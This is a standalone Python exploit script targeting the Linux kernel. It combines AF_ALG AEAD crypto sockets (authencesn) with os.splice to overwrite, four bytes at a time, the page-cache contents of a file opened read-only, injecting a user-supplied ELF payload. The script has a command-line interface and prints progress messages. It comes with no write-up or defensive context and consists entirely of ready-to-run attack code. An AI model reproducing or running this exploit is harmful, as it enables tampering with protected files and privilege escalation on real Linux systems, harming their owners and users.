#!/usr/bin/env python3
import argparse
import os
import socket
import sys


SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_AEAD_AUTHSIZE = 5
ALG_SET_OP = 3
ALG_SET_IV = 2
ALG_SET_AEAD_ASSOCLEN = 4
AF_ALG = 38


def load_payload(path):
    with open(path, "rb") as payload_file:
        return payload_file.read()


def poison_4_bytes(fd, offset, chunk):
    alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    setsockopt = alg.setsockopt
    setsockopt(SOL_ALG, ALG_SET_KEY, bytes.fromhex("0800010000000010" + "0" * 64))
    setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, 4)

    op, _ = alg.accept()
    zero = b"\x00"
    copy_len = offset + 4
    op.sendmsg(
        [b"A" * 4 + chunk],
        [
            (SOL_ALG, ALG_SET_OP, zero * 4),
            (SOL_ALG, ALG_SET_IV, b"\x10" + zero * 19),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, b"\x08" + zero * 3),
        ],
        32768,
    )

    rfd, wfd = os.pipe()
    try:
        os.splice(fd, wfd, copy_len, offset_src=0)
        os.splice(rfd, op.fileno(), copy_len)
        try:
            op.recv(8 + offset)
        except OSError:
            pass
    finally:
        os.close(rfd)
        os.close(wfd)
        op.close()
        alg.close()


def poison_fd(fd, payload, write_chunk=poison_4_bytes, chunk_size=4):
    for offset in range(0, len(payload), chunk_size):
        write_chunk(fd, offset, payload[offset:offset + chunk_size])


def poison_path(target_path, payload, opener=os.open, closer=os.close):
    fd = opener(target_path, os.O_RDONLY)
    try:
        poison_fd(fd, payload)
    finally:
        closer(fd)


def parse_args(argv):
    parser = argparse.ArgumentParser(
        description="Poison a target file's page-cache contents with an ELF payload."
    )
    parser.add_argument(
        "target",
        help="target path to open read-only",
    )
    parser.add_argument(
        "payload",
        help="ELF payload file to inject",
    )
    return parser.parse_args(argv)


def main(argv=None):
    args = parse_args(argv or sys.argv[1:])
    payload = load_payload(args.payload)

    print(f"[+] target: {args.target}")
    print(f"[+] payload file: {args.payload}")
    print(f"[+] payload length: {len(payload)} bytes")

    poison_path(args.target, payload)

    print(f"[+] wrote {len(payload)} bytes through AF_ALG/splice page-cache primitive")
    print("[+] done")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] failed: {exc}", file=sys.stderr)
        sys.exit(1)
